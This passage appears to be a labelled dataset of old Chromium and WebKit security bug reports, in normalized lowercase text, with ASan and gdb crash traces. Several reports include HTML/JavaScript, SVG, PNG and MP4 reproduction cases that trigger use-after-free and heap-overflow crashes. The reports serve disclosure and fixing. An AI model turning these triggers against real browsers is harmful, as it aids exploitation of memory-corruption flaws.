media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:407 17 in webcore scheduledaction execute webcore v8proxy media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/scheduledaction.cpp:131 18 in webcore inspectorinstrumentation hasfrontends media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/inspector/inspectorinstrumentation.h:217 19 in webcore threadtimers sharedtimerfiredinternal media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/threadtimers.cpp:118 20 in base callback void run const media/chromium/chromium/depot_tools/src/./base/callback.h:272 21 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 22 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:660 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 79815959 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 54689463 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 79815959 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 54689463 bfd dwarf error offset 1949266029 greater than or equal to debug_str size 79815959 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 54689463 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 79815959 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 54689463 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 79815959 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 54689463 23 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 24 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 25 in autorunstate media/chromium/chromium/depot_tools/src/base/message_loop.cc:745 26 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 27 in runzygote media/chromium/chromium/depot_tools/src/content/app/content_main.cc:233 28 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:455 29 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 30 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 31 in libc_start_main build/buildd/eglibc-2.12.1/csu/libc-start.c:258 is located 968 bytes inside of 2584-byte region freed by thread t0 here 0 in free 0 1 in ownptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/ownptr.h:55 2 in wtf refcounted webcore widget operator delete void media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refcounted.h:178 3 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 4 in webcore eventdispatcher dispatchevent webcore node wtf passrefptr webcore eventdispatchmediator media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatcher.cpp:56 5 in webcore node dispatchevent wtf passrefptr webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2817 6 in webcore domwindow dispatchloadevent media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/domwindow.cpp:1606 7 in webcore document dispatchwindowloadevent media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:3696 8 in webcore frameloader checkcompleted media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:794 9 in webcore frameloader finishedparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:678 10 in webcore frame page const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frame.h:345 11 in webcore htmldocumentparser preparetostopparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:381 12 in webcore documentwriter endifnotloadingmainresource media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/documentwriter.cpp:233 13 in webcore resourceerrorbase isnull const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/network/resourceerrorbase.h:42 14 in webcore mainresourceloader didfinishloading double media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/mainresourceloader.cpp:485 15 in webcore mainresourceloader continueaftercontentpolicy webcore policyaction webcore resourceresponse const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/mainresourceloader.cpp:324 16 in webcore mainresourceloader continueaftercontentpolicy webcore policyaction media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/mainresourceloader.cpp:339 17 in webcore policychecker continueaftercontentpolicy webcore policyaction media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/policychecker.cpp:195 18 in webkit frameloaderclientimpl dispatchdecidepolicyforresponse void webcore policychecker webcore policyaction webcore resourceresponse const webcore resourcerequest const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/frameloaderclientimpl.cpp:927 19 in webcore mainresourceloader didreceiveresponse webcore resourceresponse const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/mainresourceloader.cpp:431 20 in resourceresponse media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/network/chromium/resourceresponse.h:37 21 in webcore mainresourceloader loadnow webcore resourcerequest media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/mainresourceloader.cpp:580 22 in webcore mainresourceloader load webcore resourcerequest const webcore substitutedata const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/mainresourceloader.cpp:613 23 in webcore documentloader startloadingmainresource unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/documentloader.cpp:824 24 in webcore frameloader continueloadafterwillsubmitform media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:2328 25 in webcore frameloader continueloadafternavigationpolicy webcore resourcerequest const wtf passrefptr webcore formstate bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:2908 26 in passrefptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:67 27 in webcore policycallback call bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/policycallback.cpp:103 28 in webcore policychecker continueafternavigationpolicy webcore policyaction media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/policychecker.cpp:168 29 in webkit frameloaderclientimpl dispatchdecidepolicyfornavigationaction void webcore policychecker webcore policyaction webcore navigationaction const webcore resourcerequest const wtf passrefptr webcore formstate media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/frameloaderclientimpl.cpp:1012 previously allocated by thread t0 here 0 in malloc 0 1 in wtf fastmalloc unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/fastmalloc.cpp:268 2 in wtf refcounted webcore frame operator new unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refcounted.h:178 3 in wtf passrefptr webcore frame leakref const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:161 4 in frameloadrequest media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloadrequest.h:34 5 in wtf passrefptr webcore frame leakref const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:161 6 in webcore subframeloader loadorredirectsubframe webcore htmlframeownerelement webcore kurl const wtf atomicstring const bool bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/subframeloader.cpp:241 7 in webcore subframeloader requestobject webcore htmlpluginimageelement wtf string const wtf atomicstring const wtf string const wtf vector wtf string 0ul const wtf vector wtf string 0ul const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/subframeloader.cpp:148 8 in webcore htmlobjectelement updatewidget webcore plugincreationoption media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/htmlobjectelement.cpp:306 9 in webcore treeshared webcore containernode deref media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/treeshared.h:75 10 in webcore containernode resumepostattachcallbacks media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:732 11 in webcore document recalcstyle webcore node stylechange media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:1611 12 in webcore document updatestyleifneeded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:1630 13 in webcore threadtimers sharedtimerfiredinternal media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/threadtimers.cpp:118 14 in base callback void run const media/chromium/chromium/depot_tools/src/./base/callback.h:272 15 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 16 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:660 17 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 18 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 19 in autorunstate media/chromium/chromium/depot_tools/src/base/message_loop.cc:745 20 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 21 in runzygote media/chromium/chromium/depot_tools/src/content/app/content_main.cc:233 22 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:455 9634 aborting stats 37m malloced 31m for red zones by 75601 calls stats 1m realloced by 1956 calls stats 33m freed by 63667 calls stats 0m really freed by 0 calls stats 92m 23566 full pages mmaped in 23 calls mmaps by size class 8:65532 9:16382 10:8190 11:2047 12:1024 13:1536 14:256 15:256 16:64 17:64 18:16 21:6 mallocs by size class 8:58608 9:8586 10:5031 11:1396 12:387 13:1126 14:147 15:228 16:24 17:48 18:14 21:6 frees by size class 8:48032 9:7961 10:4733 11:1122 12:304 13:1100 14:122 15:222 16:17 17:34 18:14 21:6 rfrees by size class stats malloc large 68 small slow 393 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd	11
security chrome translation script downloaded over http vulnerability details the javascript script used by chrome to translate web pages is downloaded over http this script is executed in the context of the web page to be translated translate_manager.cc const char const ktranslatescripturl cb=cr.googletranslate.ontranslateelementload void translatemanager requesttranslatescript translate_script_request_pending_.reset content urlfetcher create 0 gurl ktranslatescripturl content urlfetcher get this void translatemanager onurlfetchcomplete const content urlfetcher source if error base stringpiece str resourcebundle getsharedinstance getrawdataresource idr_translate_js dcheck translate_script_.empty str.copytostring translate_script std string data source getresponseasstring data translate_script n data if error else translate the page dotranslatepage tab translate_script request.source_lang request.target_lang void translatemanager dotranslatepage webcontents tab const std string translate_script const std string source_lang const std string target_lang tab getrenderviewhost send new chromeviewmsg_translatepage tab getrenderviewhost routing_id entry getpageid translate_script source_lang target_lang ipc_message_handler chromeviewmsg_translatepage ontranslatepage translate_helper.cc void translatehelper ontranslatepage int page_id const std string translate_script const std string source_lang const std string target_lang if istranslatelibavailable evaluate the script to add the translation related method to the global context of the page executescript translate_script dcheck istranslatelibavailable translatepageimpl 0	4
heap-use-after-free in webcore eventtarget dispatchevent stacktrace from recent webkit nightly webkit/source/webcore/page/eventhandler.cpp bool eventhandler updatedraganddrop const platformmouseevent event clipboard clipboard 1 node newtarget targetnode mev if newtarget newtarget istextnode 2 newtarget newtarget parentnode if m_dragtarget newtarget if dragstate m_dragsrc dragstate shoulddispatchevents 3 dispatchdragsrcevent eventnames dragevent event 4 accept dispatchdragevent eventnames dragenterevent newtarget event clipboard 1 newtarget is the target of d d operation 2 we are dropping over a text node drag the kitty here so newtarget is set to textnode s parent 3 drag event is dispatched to the kitty we catch it with an ondrag handler inside the handler we delete newtarget node 4 newtarget is stale use after free newtarget must be a text node because targetnode mev returns a raw pointer taken from a refptr node program received signal exc_bad_access could not access memory reason 13 at address in webcore eventtarget dispatchevent this event ec at users/p/webkit/source/webcore/dom/eventtarget.cpp:165 165 if scriptexecutioncontext gdb dpc dump of assembler code from to zn7webcore11eventtarget13dispatcheventen3wtf10passrefptrins_5eventeeeri+161 call rax zn7webcore11eventtarget13dispatcheventen3wtf10passrefptrins_5eventeeeri+163 test rax rax zn7webcore11eventtarget13dispatcheventen3wtf10passrefptrins_5eventeeeri+166 sete al zn7webcore11eventtarget13dispatcheventen3wtf10passrefptrins_5eventeeeri+169 test al al zn7webcore11eventtarget13dispatcheventen3wtf10passrefptrins_5eventeeeri+171 je zn7webcore11eventtarget13dispatcheventen3wtf10passrefptrins_5eventeeeri+182 zn7webcore11eventtarget13dispatcheventen3wtf10passrefptrins_5eventeeeri+173 mov dword ptr rbp zn7webcore11eventtarget13dispatcheventen3wtf10passrefptrins_5eventeeeri+180 jmp zn7webcore11eventtarget13dispatcheventen3wtf10passrefptrins_5eventeeeri+234 zn7webcore11eventtarget13dispatcheventen3wtf10passrefptrins_5eventeeeri+182 mov rax qword ptr rbp end of assembler dump gdb i r rax 74742601567174656 garbage from heap rbx 0 rcx 17 rdx 140734799794972 rsi 140734799794864 rdi 4456096016 rbp rsp r8 729 r9 140734799793680 r10 140737486258256 r11 30174 r12 0 r13 0 r14 0 r15 114 rip webcore eventtarget dispatchevent wtf passrefptr webcore event int 161 eflags 66054 cs 39 ss 0 ds 0 es 0 fs 0 gs 0 gdb bt 0 in webcore eventtarget dispatchevent this event ec at users/p/webkit/source/webcore/dom/eventtarget.cpp:165 1 in webcore eventhandler dispatchdragevent this eventtype dragtarget event clipboard at users/p/webkit/source/webcore/page/eventhandler.cpp:1766 2 in webcore eventhandler updatedraganddrop this event clipboard at users/p/webkit/source/webcore/page/eventhandler.cpp:1852 3 in webcore dragcontroller trydhtmldrag this dragdata operation at users/p/webkit/source/webcore/page/dragcontroller.cpp:583 4 in webcore dragcontroller trydocumentdrag this dragdata actionmask=webcore dragdestinationactionany dragsession at users/p/webkit/source/webcore/page/dragcontroller.cpp:304 5 in webcore dragcontroller dragenteredorupdated this dragdata at users/p/webkit/source/webcore/page/dragcontroller.cpp:253 6 in webcore dragcontroller dragupdated this dragdata at users/p/webkit/source/webcore/page/dragcontroller.cpp:192 7 in webkit webpage performdragcontrolleraction this action=1 clientposition m_x 58 m_y 114 globalposition m_x 261 m_y 208 draggingsourceoperationmask=15 dragstoragename flags=2 sandboxextensionhandle at users/p/webkit/source/webkit2/webprocess/webpage/webpage.cpp:1914 8 in coreipc callmemberfunction webkit webpage void webkit webpage unsigned long long webcore intpoint webcore intpoint unsigned long long wtf string const unsigned int webkit sandboxextension handle const unsigned long long webcore intpoint webcore intpoint unsigned long long wtf string unsigned int webkit sandboxextension handle args object function pfn webkit webpage performdragcontrolleraction unsigned long long webcore intpoint webcore intpoint unsigned long long wtf string const unsigned int webkit sandboxextension handle const delta 0 at handlemessage.h:55 9 in coreipc handlemessage messages webpage performdragcontrolleraction webkit webpage void webkit webpage unsigned long long webcore intpoint webcore intpoint unsigned long long wtf string const unsigned int webkit sandboxextension handle const argumentdecoder object function pfn webkit webpage performdragcontrolleraction unsigned long long webcore intpoint webcore intpoint unsigned long long wtf string const unsigned int webkit sandboxextension handle const delta 0 at handlemessage.h:277 10 in webkit webpage didreceivewebpagemessage this messageid m_messageid 983105 arguments at users/p/webkit/webkitbuild/debug/derivedsources/webkit2/webpagemessagereceiver.cpp:295 11 in webkit webpage didreceivemessage this connection messageid m_messageid 983105 arguments at users/p/webkit/source/webkit2/webprocess/webpage/webpage.cpp:2248 12 in webkit webprocess didreceivemessage this connection messageid m_messageid 983105 arguments at users/p/webkit/source/webkit2/webprocess/webprocess.cpp:657 13 in coreipc connection dispatchmessage this message at users/p/webkit/source/webkit2/platform/coreipc/connection.cpp:689 14 in coreipc connection dispatchmessages this at users/p/webkit/source/webkit2/platform/coreipc/connection.cpp:716 15 in memberfunctionworkitem0 coreipc connection execute this at workitem.h:79 16 in runloop performwork this at users/p/webkit/source/webkit2/platform/runloop.cpp:63 17 in runloop performwork context at users/p/webkit/source/webkit2/platform/mac/runloopmac.mm:37 18 in cfrunloopdosources0 19 in cfrunlooprun 20 in cfrunlooprunspecific 21 in runcurrenteventloopinmode 22 in receivenexteventcommon 23 in blockuntilnexteventmatchinglistinmode 24 in dpsnextevent 25 in nsapplication nexteventmatchingmask untildate inmode dequeue 26 in nsapplication run 27 in runloop run at users/p/webkit/source/webkit2/platform/mac/runloopmac.mm:64 28 in webkit webprocessmain commandline at users/p/webkit/source/webkit2/webprocess/mac/webprocessmainmac.mm:118 29 in webkitmain commandline at users/p/webkit/source/webkit2/webprocess/webkitmain.cpp:50 30 in webkitmain argc=8 argv at users/p/webkit/source/webkit2/webprocess/webkitmain.cpp:74 31 in main gdb	11
x509usercertresourcehandler onresponsecompleted crash chrome version 18.0.1025.1 dev-m os crash id see reporting-guidelines/reporting-crash-bug for instructions url if applicable where crash occurred can you reproduce this crash what steps will reproduce this crash or if it s not reproducible what were you doing just before the crash iframe src test.php iframe php header content-type application/x-x509-user-cert please note that issues filed with no information filled in above will be marked as wontfix	9
avcodec_53 ff_h264_get_profile crash crashes on windows stable 16.0.912.77 118311 dev 18.0.1025.3 120234 and canary 18.0.1025.4 120270 crash.mp4 was made from original file bear.mp4 changed only one byte at offset to reproduce open crash.mp4 in chrome try to refresh if it does n't crash instantly 1134.1360 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=00004565 ebx=04087ea0 ecx=00000000 edx=00010001 esi=00004568 edi=04087ea0 eip=5c66f382 esp=03e6f1a0 ebp=002d2a99 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210246 5c66f382 807c050201 cmp byte ptr ebp+eax+2 1 ss:0023:002d7000 exceptionaddress 5c66f382 avcodec_53 ff_h264_get_profile exceptioncode c0000005 access violation exceptionflags 00000000 numberparameters 2 parameter 0 00000000 parameter 1 002d7000 attempt to read from address 002d7000 childebp retaddr warning stack unwind information not available following frames may be wrong 03e6f248 5c6700a2 avcodec_53 ff_h264_get_profile 03e6f288 5c763093 avcodec_53 ff_h264_decode_extradata 03e6f304 6530de75 avcodec_53 ff_h264_decode_init 03e6f348 5a0e5700 avformat_53 avformat_find_stream_info 03e6f354 5a0e6987 chrome_5a0e0000 tcmalloc threadcache allocate unsigned int size unsigned int cl memory access error 03e6f368 751f17c4 chrome_5a0e0000 anonymous namespace do_malloc unsigned int size 03e6f3d8 5a89838c kernelbase waitforsingleobjectex 03e6f424 652f31ca chrome_5a0e0000 media readcontext struct urlcontext h unsigned char buf memory read error at address int size 0n1634296933 03e6f434 652f3ccd avformat_53 ffio_set_buf_size 03e6f464 652f32d7 avformat_53 avio_seek 03e6f498 76e0f7c3 avformat_53 avio_r8 03e6f530 76e0f92a ntdll ldrpsnapthunk 03e6f5ec 76e1222b ntdll ldrgetprocedureaddressex 03e6f608 751f6cc0 ntdll ldrgetprocedureaddress 03e6f630 5b247212 kernelbase getprocaddress 03e6f690 5b250bb0 chrome_5a0e0000 delayloadhelper2 struct imgdelaydescr pidd function ppfniatentry 00000000 00000000 chrome_5a0e0000 tailmerge_avformat_53_dll	9
security heap-buffer-overflow in png_decompress_chunk vulnerability details some code from png_decompress_chunk png_size_t expanded_size png_inflate png_ptr png_bytep png_ptr chunkdata prefix_size chunklength prefix_size 0 output 0 output size some code removed png_charp text png_malloc_warn png_ptr prefix_size expanded_size 1 some code removed png_memcpy text png_ptr chunkdata prefix_size here expanded_size returned by png_inflate can be arbitrarily large this is because png_inflate decompresses data in small chunks and throws them away if output argument is 0 therefore prefix_size expanded_size can overflow png_size_t 32 bits on my machine which leads to faulty malloc and heap-buffer-overflow bytes at chunkdata and prefix_size are attacker-controlled version tested on chrome 18.0.969.0 developer build 113953 linux custom aurora 9.0 epiphany 2.30.2 operating system linux 2.6.32 ubuntu 10.04 reproduction case attached is gzipped bad.png with an iccp chunk that contains a'-s as prefix and a'-s compressed to 4 mib additional crash information type of crash tab crash state program received signal sigsegv segmentation fault in gdb bt 0 in 1 in from lib/libpng12.so.0 2 in from lib/libpng12.so.0 3 in from lib/libpng12.so.0 4 in from lib/libpng12.so.0 5 in from lib/libpng12.so.0 6 in png_process_data from lib/libpng12.so.0 7 in webcore pngimagereader decode this data sizeonly=true at third_party/webkit/source/webcore/platform/image-decoders/png/pngimagedecoder.cpp:143 8 in webcore pngimagedecoder decode this onlysize=true at third_party/webkit/source/webcore/platform/image-decoders/png/pngimagedecoder.cpp:437 9 in webcore pngimagedecoder issizeavailable this at third_party/webkit/source/webcore/platform/image-decoders/png/pngimagedecoder.cpp:188 10 in webcore imagesource issizeavailable this at third_party/webkit/source/webcore/platform/graphics/imagesource.cpp:100 11 in webcore bitmapimage issizeavailable this at third_party/webkit/source/webcore/platform/graphics/bitmapimage.cpp:254 12 in webcore bitmapimage datachanged this type return to continue or q return to quit q gdb x/1i eip can not access memory at address gdb info reg eax 1202187776 ecx 4096 edx 1196720126 ebx 779716903 esp ebp esi 1201784576 edi 8192 eip eflags sf if rf id cs 115 ss 123 ds 123 es 123 fs 0 gs 51	7
bad cast in addchildtoanonymouscolumnblocks vulnerability details crash version chrome version stable beta trunk operating system 64 bit linux reproduction case html head script onload function var el0 document.createelement div el0.style.display='-webkit-inline-box el0.style webkit-column-width 0 document.body.appendchild el0 var el1 document.createelement div el1.style webkit-column-span all el0.appendchild el1 var el2 document.createelement span el0.appendchild el2 el2.appendchild document.createelement div var el3 document.createelement div el3.style.display='table-column el0.appendchild el3 el0.appendchild document.createelement div script head body body html for crashes please include the following additional information type of crash renderer crash state 10740 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in webcore renderdeprecatedflexiblebox calchorizontalprefwidths 0 1 in webcore renderdeprecatedflexiblebox computepreferredlogicalwidths 0 is located 80 bytes inside of 96-byte region freed by thread t0 here 0 in free 0 1 in webcore renderboxmodelobject renderboxmodelobject 0 2 in webcore rendertablerow rendertablerow 0	11
use after free in v8htmlelementwrapperfactory.cpp vulnerability details running attached all.html file causes chrome to display sad tab version chrome version 15.0.874.120 stable 17.0.954.0 developer build 111694 linux operating system ubuntu 10.04 reproduction case 1 copy attached all.html and geo.html files to same folder 2 open all.html file in chrome 3 wait about 2 seconds when page loads and click on test button chrome will display a sad tab but this does not happen always so we might need to try several times i understand that all.html contains some unnecessary lines i will post a reduced test case as soon as i figure out which parts are unnecessary actually this bug occurred to me randomly while i was testing something else for crashes please include the following additional information type of crash tab crash state exception record 0 in wtf refptr wtf stringimpl get this at third_party/webkit/source/javascriptcore/wtf/refptr.h:60 60 t get const return m_ptr stack trace 0 in wtf refptr wtf stringimpl get this at third_party/webkit/source/javascriptcore/wtf/refptr.h:60 1 in wtf string impl this at third_party/webkit/source/javascriptcore/wtf/text/wtfstring.h:143 2 in wtf atomicstring impl this at third_party/webkit/source/javascriptcore/wtf/text/atomicstring.h:62 3 in webcore createv8htmlwrapper element forcenewobject=false at out/debug/obj/gen/webkit/v8htmlelementwrapperfactory.cpp:801 4 in webcore tov8 impl forcenewobject=false at third_party/webkit/source/webcore/bindings/v8/custom/v8htmlelementcustom.cpp:60 5 in webcore tov8 impl forcenewobject=false at third_party/webkit/source/webcore/bindings/v8/custom/v8elementcustom.cpp:61 6 in getelementbyidcallback args at out/debug/obj/gen/webcore/bindings/v8document.cpp:1351 7 in handleapicallhelper false args isolate at v8/src/builtins.cc:1177 8 in builtin_impl_handleapicall args isolate at v8/src/builtins.cc:1194 9 in builtin_handleapicall args isolate at v8/src/builtins.cc:1193 10 in registers rax 3906369333256140382 rbx 0 rcx 140597546377600 rdx 0 rsi 0 rdi 3906369333256140382 rbp rsp r8 140597546330256 r9 3444 r10 140597791190432 r11 140597670591054 r12 140735474331880 r13 1 r14 3 r15 140735474331888 rip wtf refptr wtf stringimpl get const+12 eflags if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0	11
heap-buffer-overflow in webcore svglength valueasstring vulnerability details heap buffer overflow can be triggered while building svg animated element length version 18.0.974.0 developer build 114913 linux crashes also on windows 7 16.0.912.63 m but not under debugger ca n't crash under linux 16.0.912.63 it s behavior is weird does n't load second time however first crash was caught in this version reproduction case html head script function go c 0 q document.getelementbyid root contentdocument s q.getelementbyid s a q.getelementbyid a setinterval function crash if c==0 s.id x if c==1 s.appendchild a.clonenode 0 if c==2 settimeout s.id b 1 c 1 script head body object data f.svg id root onload go object body html f.svg svg id s xmlns xmlns xlink text id x text animate xlink href x id a attributename y from 1 to 2 dur 1s svg for crashes please include the following additional information 32190 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in webcore svglength valueasstring const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svglength.cpp:252 1 in webcore svglengthlist valueasstring const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svglengthlist.cpp:66 2 in webcore svganimatedtype valueasstring media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svganimatedtype.cpp:312 3 in webcore svganimateelement applyresultstotarget media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svganimateelement.cpp:233 4 in webcore smiltimecontainer updateanimations webcore smiltime double wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/animation/smiltimecontainer.cpp:297 5 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 6 in webcore threadtimers sharedtimerfiredinternal media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/threadtimers.cpp:118 is located 0 bytes to the right of 128-byte region allocated by thread t0 here 0 in malloc 0 1 in wtf fastmalloc unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/fastmalloc.cpp:268 2 in wtf vector webcore svglength 0ul expandcapacity unsigned long webcore svglength const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/vector.h:786 3 in webcore svganimationelement updateanimation float unsigned int webcore svgsmilelement media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svganimationelement.cpp:624 4 in webcore svgsmilelement progress webcore smiltime webcore svgsmilelement media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/animation/svgsmilelement.cpp:947 5 in webcore smiltimecontainer updateanimations webcore smiltime double wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/animation/smiltimecontainer.cpp:277 6 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 7 in webcore threadtimers sharedtimerfiredinternal media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/threadtimers.cpp:118 32190 aborting stats 30m malloced 25m for red zones by 61515 calls stats 1m realloced by 1131 calls stats 24m freed by 47396 calls stats 0m really freed by 0 calls stats 84m 21518 full pages mmaped in 21 calls mmaps by size class 8:65532 9:8191 10:4095 11:2047 12:1024 13:1024 14:256 15:256 16:64 17:64 18:16 19:8 21:4 22:1 mallocs by size class 8:49099 9:6324 10:3288 11:1202 12:344 13:911 14:130 15:148 16:23 17:36 18:1 19:4 21:4 22:1 frees by size class 8:36909 9:5277 10:2960 11:846 12:238 13:872 14:110 15:139 16:16 17:20 18:1 19:4 21:4 rfrees by size class stats malloc large 46 small slow 312 shadow byte and word fa fa fa fa fa fa fa fa fa more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa	11
heap-use-after-free in webcore svgelement removedfromdocument vulnerability details heap use after free can be triggered in svg while changing document and using it contents version 18.0.1018.0 developer build 119055 linux does not reproduce on 16.0.912.77 m win7 x64 reproduction case svg xmlns font font-face id f font-family svgarial font stop id s script x document.createrange x.selectnodecontents document.getelementbyid s x.surroundcontents document.getelementbyid f location.reload script svg for crashes please include the following additional information 6238 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore svgelement removedfromdocument usr/local/google/asan/asan-llvm-trunk/llvm/projects/compiler-rt/lib/asan/asan_allocator.cc:0 1 in webcore private noderemovaldispatcher webcore node true dispatch webcore node media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernodealgorithms.h:99 2 in wtf ownptr webcore documentmarkercontroller operator const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/ownptr.h:64 3 in wtf refcounted webcore range operator delete void media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refcounted.h:178 4 in void webcore domdata handleweakobject void webcore domdatastore domwrappermaptype v8 persistent v8 object void media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/domdata.h:84 5 in webcore domdatastore weakdomobjectcallback v8 persistent v8 value void media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/domdatastore.cpp:135 6 in v8 internal runtimeprofiler isenabled media/chromium/chromium/depot_tools/src/v8/src/runtime-profiler.h:50 is located 40 bytes inside of 136-byte region freed by thread t0 here 0 in operator delete void 0 1 in hashtable media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/hashtable.h:313 2 in webcore cachedresourceclient operator delete void media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/cache/cachedresourceclient.h:35 3 in wtf vectordestructor true wtf ownptr webcore cssfontfacesource destruct wtf ownptr webcore cssfontfacesource wtf ownptr webcore cssfontfacesource 